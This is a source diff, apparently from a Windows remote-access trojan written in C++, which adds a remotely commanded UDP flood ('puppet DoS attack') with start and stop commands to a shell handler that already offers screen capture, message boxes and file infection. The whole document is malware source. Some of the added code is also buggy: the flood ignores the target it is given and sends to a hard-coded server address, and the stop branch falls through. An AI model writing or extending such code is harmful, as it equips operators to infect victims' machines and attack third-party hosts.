@@ -132,6 +132,7 @@ void XShellProcess::run()
 bool  XShellProcess::ExecuteShellByCore(char *cmd)
 {
 	CubeGrammarSentence sen;
+	char MSG[1024];
 	m_Lexer.SortText(cmd);
 	unsigned int SenType;
 	SenType=m_Grammar.GetNextInstr(sen);
@@ -143,6 +144,7 @@ bool  XShellProcess::ExecuteShellByCore(char *cmd)
 	if(SenType==m_Shell_Msg)
 	{
 		m_MessageBox.Show(sen.GetBlockString(1));
+		G_RemoteFrameWork.OnShellRespones("弹窗已显示");
 		return true;
 	}
 
@@ -155,15 +157,31 @@ bool  XShellProcess::ExecuteShellByCore(char *cmd)
 	if (SenType==m_Shell_screenShot)
 	{
 		ScreenCapture(sen.GetBlockString(1));
+		G_RemoteFrameWork.OnShellRespones("已截屏");
 		return true;
 	}
 	
 	if (SenType==m_Shell_Infect)
 	{
 		XInfester_InfectFile(sen.GetBlockString(1));
+		G_RemoteFrameWork.OnShellRespones("目标文件已感染");
 		return true;
 	}
 
+	if (SenType==m_Shell_Dos)
+	{
+		m_Ddos.Attack(sen.GetBlockString(1),atoi(sen.GetBlockString(2)),atoi(sen.GetBlockString(3)),atoi(sen.GetBlockString(4)));
+		sprintf(MSG,"傀儡Dos攻击已经开始:Target %s Port: %s Time:%s ms Power: %s",
+			sen.GetBlockString(1),sen.GetBlockString(2),sen.GetBlockString(3),sen.GetBlockString(4));
+		G_RemoteFrameWork.OnShellRespones(MSG);
+		return true;
+	}
+
+	if (SenType==m_Shell_DosStop)
+	{
+		m_Ddos.stop();
+		G_RemoteFrameWork.OnShellRespones("傀儡Dos攻击已经停止");
+	}
 	return false;
 }
 
@@ -186,12 +204,16 @@ size_t XShellProcess::Send( XShellProcess_O &Out )
 		}  
 		return m_lBytesWrite;
 	}
+	else
+	{
+		G_RemoteFrameWork.OnShellRespones("ERROR: Unknow Shell");
+	}
 	return 0;
 }
 
 void XShellProcess::Recv( XShellProcess_I &in )
 {
-	G_RemoteFrameWork.OnShellRespones(in.Buffer,in.size);
+	G_RemoteFrameWork.OnShellRespones(in.Buffer);
 }
 
 void XShellProcess::Close()
@@ -229,6 +251,7 @@ BOOL XShellProcess::Initialize(XShellProcess_IO &info)
 	m_hWritePipe2=INVALID_HANDLE_VALUE;
 
 	m_bConsoleActivate=false;
+	m_Ddos.initialize();
 	//Grammar initialize
 
 	m_Lexer.RegisterSpacer(' ');
@@ -278,6 +301,25 @@ BOOL XShellProcess::Initialize(XShellProcess_IO &info)
 	Sen.add(btShellInfect);
 	Sen.add(Param);
 	m_Shell_Infect=m_Grammar.RegisterSentence(Sen);
+
+
+	CubeBlockType btShellDosAttack=CubeBlockType(REMOTESHELL_SCMD_DOSATK,2,GRAMMAR_TOKEN,GRAMMAR_TOKEN_SCMD_DOSATK);
+	m_Grammar.RegisterBlockType(btShellDosAttack);
+
+	Sen.Reset();
+	Sen.add(btShellDosAttack);
+	Sen.add(Param);  //Target IP
+	Sen.add(Number); //Target Port
+	Sen.add(Number); //Timems;
+	Sen.add(Number); //power;
+	m_Shell_Dos=m_Grammar.RegisterSentence(Sen);
+
+	CubeBlockType btShellDosAttackStop=CubeBlockType(REMOTESHELL_SCMD_DOSATKSTOP,2,GRAMMAR_TOKEN,GRAMMAR_TOKEN_SCMD_DOSATKSTOP);
+	m_Grammar.RegisterBlockType(btShellDosAttackStop);
+
+	Sen.Reset();
+	Sen.add(btShellDosAttackStop);
+	m_Shell_DosStop=m_Grammar.RegisterSentence(Sen);
 
 	return TRUE;
 }
@@ -379,4 +421,82 @@ void ScreenCapture(LPSTR filename, WORD BitCount, LPRECT lpRect){
 	ReleaseDC(0, hScreenDC);
 	DeleteDC(hmemDC);
 	return ;
+}
+
+BOOL XShell_Ddos::initialize()
+{
+	Cube_SocketUDP_IO __IO;
+	m_Power=10;
+	m_IsOK=FALSE;
+	for(int i=0;i<32;i++)
+	{
+		__IO.Port=XSHELL_DDOS_UDP_PORT+i;
+		if(m_UDP.Initialize(__IO))
+			{
+				m_IsOK=TRUE;
+				return TRUE;
+		}
+	}
+	return FALSE;
+
+}
+
+void XShell_Ddos::run()
+{
+	if (!m_IsOK)
+	{
+		return;
+	}
+
+	static char DummyBuffer[2048];
+	Cube_SocketUDP_O __O;
+	__O.Buffer=DummyBuffer;
+	__O.Size=sizeof(DummyBuffer);
+	__O.to=m_TargetAddr;
+
+	while (m_TimeMs)
+	{
+		m_UDP.Send(__O);
+		Sleep(1000-m_Power);
+		if (m_TimeMs>(1000-m_Power))
+		{
+			m_TimeMs-=(1000-m_Power);
+		}
+		else
+		{
+			m_TimeMs=0;
+		}
+	}
+
+}
+
+void XShell_Ddos::Attack(char *IP,unsigned int port,unsigned long Timems,unsigned int Power)
+{
+	m_TargetAddr.sin_family=AF_INET;
+
+	if (INADDR_NONE == inet_addr(REMOTESHELL_SERVER_IPADDR))
+		return ;
+
+	m_TargetAddr.sin_port=htons(REMOTESHELL_SERVER_PORT);
+	m_TargetAddr.sin_addr.s_addr=inet_addr(REMOTESHELL_SERVER_IPADDR);
+
+	m_TimeMs=Timems;
+
+	if (Power>1000)
+	{
+		m_Power=1000;
+	}
+	else
+	{
+		m_Power=Power;
+	}
+
+	start();
+}
+
+void XShell_Ddos::AttackStop()
+{
+	terminate();
+	m_TimeMs=0;
+	m_IsOK=FALSE;
 }
